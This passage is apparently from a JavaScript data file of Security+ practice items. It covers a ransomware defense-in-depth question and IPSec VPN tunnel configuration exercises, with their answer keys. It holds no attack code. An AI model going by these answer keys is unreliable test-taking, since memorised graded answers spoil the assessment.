        { id: 'perimeter', label: 'Perimeter', control: 'Email spam filtering', state: 'present', device: { label: 'SEG-1' } },
        { id: 'endpoint', label: 'Endpoint', control: 'EDR with ransomware behavior detection', state: 'missing' },
        { id: 'backup', label: 'Backup', control: 'Immutable, network-isolated backups', state: 'missing' },
        { id: 'awareness', label: 'Personnel', control: 'Security awareness training', state: 'missing' }
      ],
      core: { label: 'Case files and client data', assets: [
        { id: 'case-files', label: 'Case files & client data', exposed: true },
        { id: 'shr1', label: 'SHR-1 (backup share reachable from every workstation)', exposed: true }
      ] }
    } },
    steps: [
      { id: 'd1', type: 'configure', points: 1,
        prompt: 'What is the core flaw in this architecture?',
        explanation: 'Spam filtering alone is not defense in depth. With no EDR to catch what slips through, no isolated backups to fall back on, and no trained staff to hesitate before clicking, one successful phishing email can encrypt both production data and its own backup.',
        payload: { slots: [ { id: 'flaw', label: 'Core flaw', options: [
          { id: 'f1', text: 'A single email filter is the only defense, with no endpoint, backup, or human layer behind it' },
          { id: 'f2', text: 'The law firm uses too much email' },
          { id: 'f3', text: 'The spam filter vendor changed pricing' },
          { id: 'f4', text: 'The office needs a faster printer' }
        ] } ] },
        answer: { slots: { flaw: 'f1' } } },
      { id: 'f1', type: 'configure', points: 1,
        prompt: 'Build the inner layers.',
        explanation: 'EDR catches ransomware behavior that slips past email filtering, immutable and network-isolated backups survive an encryption event, and trained staff are far less likely to trigger the infection in the first place.',
        payload: { slots: [
          { id: 'endpoint', label: 'Endpoint layer', options: [
            { id: 'a1', text: 'EDR with ransomware behavior detection' }, { id: 'a2', text: 'Rely on spam filtering alone' }, { id: 'a3', text: 'Disable antivirus to improve performance' } ] },
          { id: 'backup', label: 'Backup layer', options: [
            { id: 'b1', text: 'Immutable backups isolated from the production network' }, { id: 'b2', text: 'Backups on a share reachable from every workstation' }, { id: 'b3', text: 'No backups, restore from vendor support instead' } ] },
          { id: 'awareness', label: 'Personnel layer', options: [
            { id: 'c1', text: 'Regular security awareness training with phishing simulations' }, { id: 'c2', text: 'No training, trust staff judgment' }, { id: 'c3', text: 'A one-time training video at hiring only' } ] }
        ] },
        answer: { slots: { endpoint: 'a1', backup: 'b1', awareness: 'c1' } } },
      { id: 't1', type: 'configure', points: 1,
        prompt: 'Security awareness training is best classified as which control type?',
        explanation: 'Awareness training is a managerial/administrative program that reduces the likelihood of an incident before it happens, which makes it preventive rather than detective or corrective.',
        payload: { slots: [ { id: 'type', label: 'Control type', options: [
          { id: 't1', text: 'Managerial, preventive' },
          { id: 't2', text: 'Technical, detective' },
          { id: 't3', text: 'Physical, compensating' },
          { id: 't4', text: 'Operational, corrective' }
        ] } ] },
        answer: { slots: { type: 't1' } } }
    ]
  },
  // ===== Wave 5 — VPN Tunnel Parameter Negotiation (vpntunnel, obj 3.2/1.4) =====
  // Guarded dualpanel configure: payload.layout 'dualpanel' + payload.scoring 'tunnel'.
  // P1 = auth / enc / integrity / DH group -- all four are genuine must-match IKE
  // Phase 1 proposal parameters (4 symmetry pairs). SA lifetime is deliberately NOT
  // a symmetry slot: IKEv1 settles on the lesser value and IKEv2 does not negotiate
  // it at all, so pairing it would teach a false rule.
  // P2 = local / remote / PFS / transform. PFS sits in Phase 2, where the choice
  // actually exists -- Phase 1 always performs a DH exchange. AH is folded into the
  // transform list so the protocol choice is a real distractor, not a free point.
  // Units: P1 8 membership + 4 symmetry = 12; P2 8 + 2 symmetry + 2 mirror = 12; 24 total.
  // Every constraint an answer depends on is stated in the scenario prose, not only
  // in the policyFloor tags. Vendor-neutral open-standard vocabulary throughout.
  {
    id: 'sp-vpn-01', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Stand up the site-to-site tunnel to Frankfurt',
    estMinutes: 5, policyFloor: ['no-psk','pfs','aes192-min'],
    scenario: 'Your company just signed a logistics partner in Frankfurt, and their ERP needs a permanent encrypted path into your London network. You own both IPSec gateways. Security standard for this link, and it is not negotiable: certificate authentication only (no pre-shared keys), Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent key-agreement group or better, and perfect forward secrecy on every child-SA rekey. Symmetric encryption is AES-192 minimum at both phases. Configure Phase 1 and Phase 2 on both ends so the tunnel actually negotiates.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'London HQ', type: 'network', subnet: '10.10.0.0/16', note: 'GW-LON · 203.0.113.10' },
      { id: 'siteB', label: 'Frankfurt', type: 'network', subnet: '10.20.0.0/16', note: 'GW-FRA · 198.51.100.22' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on both gateways to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. Certificates satisfy the no-pre-shared-key rule. AES-192 and AES-256 both clear the encryption floor — a genuine set, not a single answer — but both ends must land on the SAME one or there is no common proposal.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-LON · London' }, { id: 'B', label: 'GW-FRA · Frankfurt' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key' }, { id: 'cert', text: 'Digital certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key' }, { id: 'cert', text: 'Digital certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert'], 'a-enc': ['aes192','aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert'], 'b-enc': ['aes192','aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Define the protected traffic and the Phase 2 transform on both gateways.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. Both AES-192-CBC with HMAC-SHA-256 and AES-256-GCM clear the AES-192 floor here.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-LON · London' }, { id: 'B', label: 'GW-FRA · Frankfurt' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'lon', text: '10.10.0.0/16 · London HQ' }, { id: 'fra', text: '10.20.0.0/16 · Frankfurt' }, { id: 'pub', text: '203.0.113.0/24 · public range' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'lon', text: '10.10.0.0/16 · London HQ' }, { id: 'fra', text: '10.20.0.0/16 · Frankfurt' }, { id: 'pub', text: '203.0.113.0/24 · public range' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'lon', text: '10.10.0.0/16 · London HQ' }, { id: 'fra', text: '10.20.0.0/16 · Frankfurt' }, { id: 'pub', text: '203.0.113.0/24 · public range' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'lon', text: '10.10.0.0/16 · London HQ' }, { id: 'fra', text: '10.20.0.0/16 · Frankfurt' }, { id: 'pub', text: '203.0.113.0/24 · public range' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['lon'], 'a-remote': ['fra'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espaes192','espgcm'], 'b-local': ['fra'], 'b-remote': ['lon'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espaes192','espgcm'] } } }
    ]
  },

  {
    id: 'sp-vpn-02', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Replicate to Dublin under an AES-256 standard',
    estMinutes: 5, policyFloor: ['pfs','aes256-min'],
    scenario: 'Nightly database replication between your Manchester datacentre and the Dublin standby site currently rides a leased line that finance has cancelled, so it has to move onto a site-to-site IPSec tunnel across the internet. Because the replica carries full customer records, the crypto standard for this link is AES-256 and nothing weaker, at both phases, with Phase 1 integrity of SHA-256 or better, a 2048-bit-equivalent key-agreement group or better, and perfect forward secrecy on rekey. Both gateways are yours, and the shared secret is a 32-character random string held only in the two configs, so either authentication method is acceptable on this link. Only the two named datacentre subnets are in scope for this tunnel — nothing else belongs in the selectors.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Manchester DC', type: 'network', subnet: '172.16.0.0/16', note: 'GW-MAN · 203.0.113.40' },
      { id: 'siteB', label: 'Dublin standby', type: 'network', subnet: '172.20.0.0/16', note: 'GW-DUB · 198.51.100.71' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on both gateways to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. An AES-256 standard collapses the encryption slot to one legal pick. Authentication stays a genuine set: a 32-character random pre-shared key carries enough entropy to resist offline guessing, and both endpoints are under your control, so PSK and certificates are both sound here — certificates simply scale better once there are more than two peers.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-MAN · Manchester' }, { id: 'B', label: 'GW-DUB · Dublin' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key (32-char random)' }, { id: 'cert', text: 'Digital certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'psk', text: 'Pre-shared key (32-char random)' }, { id: 'cert', text: 'Digital certificates' }, { id: 'noauth', text: 'No peer authentication' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['psk','cert'], 'a-enc': ['aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['psk','cert'], 'b-enc': ['aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Define the replication traffic selectors and Phase 2 transform on both gateways.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. AES-256-GCM is the only transform meeting the AES-256 standard, and as an AEAD mode it carries its own integrity rather than bolting on a separate HMAC; every CBC option here sits below the floor. A 0.0.0.0/0 pair does mirror and would negotiate, which is exactly what makes it a trap — it drags every packet either site sends into the tunnel instead of the replication traffic you scoped.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-MAN · Manchester' }, { id: 'B', label: 'GW-DUB · Dublin' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'man', text: '172.16.0.0/16 · Manchester DC' }, { id: 'dub', text: '172.20.0.0/16 · Dublin standby' }, { id: 'any', text: '0.0.0.0/0 · any' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'man', text: '172.16.0.0/16 · Manchester DC' }, { id: 'dub', text: '172.20.0.0/16 · Dublin standby' }, { id: 'any', text: '0.0.0.0/0 · any' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'man', text: '172.16.0.0/16 · Manchester DC' }, { id: 'dub', text: '172.20.0.0/16 · Dublin standby' }, { id: 'any', text: '0.0.0.0/0 · any' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'man', text: '172.16.0.0/16 · Manchester DC' }, { id: 'dub', text: '172.20.0.0/16 · Dublin standby' }, { id: 'any', text: '0.0.0.0/0 · any' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['man'], 'a-remote': ['dub'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espgcm'], 'b-local': ['dub'], 'b-remote': ['man'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espgcm'] } } }
    ]
  },

  {
    id: 'sp-vpn-03', cert: 'secplus', archetype: 'vpntunnel', objective: '3.2',
    topic: 'Secure enterprise infrastructure', title: 'Cut the branch tunnel off 3DES mid-migration',
    estMinutes: 6, policyFloor: ['legacy-migration','no-psk','pfs','aes192-min'],
    scenario: 'An audit flagged the tunnel between the Slough branch and your core datacentre: it still negotiates 3DES with SHA-1 and DH group 2, settings inherited from gateways retired years ago. Those old gateways were disposed of without their configs being wiped, so the existing pre-shared key must be treated as exposed and the credential is in scope tonight alongside the algorithms. The branch circuit is run by a partner who operates GW-SLO; you have agreed the settings they will apply and you own GW-CORE. Security standard for this link, and it is not negotiable: certificate authentication only (no pre-shared keys), Phase 1 integrity SHA-256 or better, a 2048-bit-equivalent key-agreement group or better, and perfect forward secrecy on every child-SA rekey. Encryption is AES-192 minimum at both phases, and the tunnel must protect only the branch’s own 192.168.10.0/24 — not the wider branch supernet. They have also emailed a proposed Phase 1 for review.',
    assets: { reference: { kind: 'network', devices: [
      { id: 'siteA', label: 'Slough branch', type: 'network', subnet: '192.168.10.0/24', note: 'GW-SLO · partner-operated · 203.0.113.88' },
      { id: 'siteB', label: 'Core datacentre', type: 'network', subnet: '10.30.0.0/16', note: 'GW-CORE · 198.51.100.5' }
    ] } },
    steps: [
      { id: 'p1', type: 'configure', points: 1,
        prompt: 'Configure the IKE Phase 1 proposal on both gateways to the stated standard.',
        explanation: 'Encryption, integrity, key-agreement group and authentication method must MATCH on both peers or Phase 1 never completes — the responder walks the initiator’s proposal list and, finding nothing it also has configured, returns no proposal chosen. (SA lifetime is the exception and is deliberately not asked here: IKEv1 settles on the shorter of the two values and IKEv2 treats it as purely local.) SHA-256 and SHA-384 both clear the integrity floor; MD5 and SHA-1 sit below it and are being retired. Group 14 gives roughly 112-bit security and group 19 roughly 128-bit, so either clears the floor — groups 2 and 5 do not. A migration is finished only when both ends move, and not because IKE quietly downgrades — it does not. Leave the legacy algorithms configured ALONGSIDE the new ones on both peers and they can still settle on the old suite, so the legacy proposal has to be removed rather than merely supplemented. And it has to come out of both ends together: cut one peer over while the other still offers nothing BUT the legacy suite and there is no proposal either side accepts, so the tunnel stops coming up at all. That is why this is one coordinated change. 3DES is retired for its 64-bit block size (collisions become practical after enough data under one key) and its ~112-bit effective strength; SHA-1 and the exposed key both go with it.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-SLO · Slough' }, { id: 'B', label: 'GW-CORE · datacentre' } ],
          slots: [
            { id: 'a-auth', panel: 'A', label: 'Authentication method', options: [ { id: 'pskold', text: 'Existing pre-shared key (unrotated)' }, { id: 'cert', text: 'Digital certificates' }, { id: 'psk', text: 'Pre-shared key' } ] },
            { id: 'a-enc', panel: 'A', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'a-int', panel: 'A', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'a-dh', panel: 'A', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] },
            { id: 'b-auth', panel: 'B', label: 'Authentication method', options: [ { id: 'pskold', text: 'Existing pre-shared key (unrotated)' }, { id: 'cert', text: 'Digital certificates' }, { id: 'psk', text: 'Pre-shared key' } ] },
            { id: 'b-enc', panel: 'B', label: 'Phase 1 encryption', options: [ { id: 'des3', text: '3DES' }, { id: 'aes128', text: 'AES-128' }, { id: 'aes192', text: 'AES-192' }, { id: 'aes256', text: 'AES-256' } ] },
            { id: 'b-int', panel: 'B', label: 'Phase 1 integrity', options: [ { id: 'md5', text: 'MD5' }, { id: 'sha1', text: 'SHA-1' }, { id: 'sha256', text: 'SHA-256' }, { id: 'sha384', text: 'SHA-384' } ] },
            { id: 'b-dh', panel: 'B', label: 'Key-agreement group', options: [ { id: 'dh2', text: 'DH group 2 (1024-bit MODP)' }, { id: 'dh5', text: 'DH group 5 (1536-bit MODP)' }, { id: 'dh14', text: 'DH group 14 (2048-bit MODP)' }, { id: 'dh19', text: 'DH group 19 (256-bit ECP)' } ] }
          ],
          symmetryPairs: [ ['a-auth','b-auth'], ['a-enc','b-enc'], ['a-int','b-int'], ['a-dh','b-dh'] ],
          mirrorPairs: [  ] },
        answer: { slots: { 'a-auth': ['cert'], 'a-enc': ['aes192','aes256'], 'a-int': ['sha256','sha384'], 'a-dh': ['dh14','dh19'], 'b-auth': ['cert'], 'b-enc': ['aes192','aes256'], 'b-int': ['sha256','sha384'], 'b-dh': ['dh14','dh19'] } } },
      { id: 'p2', type: 'configure', points: 1,
        prompt: 'Rebuild Phase 2 for the branch-to-core traffic on both gateways.',
        explanation: 'Perfect forward secrecy is a PHASE 2 decision: it means running a FRESH Diffie-Hellman exchange when the child SA is established and rekeyed, instead of deriving its keys from the Phase 1 secret. Without it, recovering the Phase 1 keying material later unlocks every child SA derived from it. Phase 1 always performs a DH exchange — there is no configuration that skips it — so PFS is the only place this choice genuinely exists. The selectors MIRROR: each end’s local network is the other end’s remote. Get that backwards and Phase 1 completes happily, then the child SA is refused for an unacceptable traffic selector. AH is a real trap in the transform list — it authenticates and integrity-protects but does not encrypt anything. The two sites use different prefix lengths (a /24 and a /16) and that is perfectly normal. Two things go wrong here. A selector that does not mirror — the core listing 192.168.0.0/16 as its remote while the branch proposes 192.168.10.0/24 — is refused by an exact-match implementation; IKEv2 may narrow a wider configured range to the one proposed, but leaning on that is how selector mismatches become intermittent faults nobody can reproduce. And the branch supernet mirrors perfectly well on both ends while still being wrong: it claims every 192.168.x.x range for this tunnel when only the branch’s own /24 was ever in scope.',
        payload: { layout: 'dualpanel', scoring: 'tunnel',
          panels: [ { id: 'A', label: 'GW-SLO · Slough' }, { id: 'B', label: 'GW-CORE · datacentre' } ],
          slots: [
            { id: 'a-local', panel: 'A', label: 'Local subnet', options: [ { id: 'slo', text: '192.168.10.0/24 · Slough branch' }, { id: 'core', text: '10.30.0.0/16 · Core datacentre' }, { id: 'slowide', text: '192.168.0.0/16 · all branch ranges' } ] },
            { id: 'a-remote', panel: 'A', label: 'Remote subnet', options: [ { id: 'slo', text: '192.168.10.0/24 · Slough branch' }, { id: 'core', text: '10.30.0.0/16 · Core datacentre' }, { id: 'slowide', text: '192.168.0.0/16 · all branch ranges' } ] },
            { id: 'a-pfs', panel: 'A', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'a-xform', panel: 'A', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] },
            { id: 'b-local', panel: 'B', label: 'Local subnet', options: [ { id: 'slo', text: '192.168.10.0/24 · Slough branch' }, { id: 'core', text: '10.30.0.0/16 · Core datacentre' }, { id: 'slowide', text: '192.168.0.0/16 · all branch ranges' } ] },
            { id: 'b-remote', panel: 'B', label: 'Remote subnet', options: [ { id: 'slo', text: '192.168.10.0/24 · Slough branch' }, { id: 'core', text: '10.30.0.0/16 · Core datacentre' }, { id: 'slowide', text: '192.168.0.0/16 · all branch ranges' } ] },
            { id: 'b-pfs', panel: 'B', label: 'Phase 2 perfect forward secrecy', options: [ { id: 'nopfs', text: 'No PFS · rekey the child SA from Phase 1 keying material' }, { id: 'pfs14', text: 'PFS · fresh DH group 14 exchange at each rekey' }, { id: 'pfs19', text: 'PFS · fresh DH group 19 exchange at each rekey' } ] },
            { id: 'b-xform', panel: 'B', label: 'Phase 2 transform', options: [ { id: 'ah', text: 'AH · integrity only, no encryption' }, { id: 'esp3des', text: 'ESP · 3DES-CBC + HMAC-SHA-1' }, { id: 'espaes128', text: 'ESP · AES-128-CBC + HMAC-SHA-256' }, { id: 'espaes192', text: 'ESP · AES-192-CBC + HMAC-SHA-256' }, { id: 'espgcm', text: 'ESP · AES-256-GCM (AEAD)' } ] }
          ],
          symmetryPairs: [ ['a-pfs','b-pfs'], ['a-xform','b-xform'] ],
          mirrorPairs: [ ['a-local','b-remote'], ['a-remote','b-local'] ] },
        answer: { slots: { 'a-local': ['slo'], 'a-remote': ['core'], 'a-pfs': ['pfs14','pfs19'], 'a-xform': ['espaes192','espgcm'], 'b-local': ['core'], 'b-remote': ['slo'], 'b-pfs': ['pfs14','pfs19'], 'b-xform': ['espaes192','espgcm'] } } },
      { id: 'p3', type: 'analyze', points: 1,
        prompt: 'The partner emailed the Phase 1 they intend to apply to GW-SLO. Which single line would leave the audit finding open?',
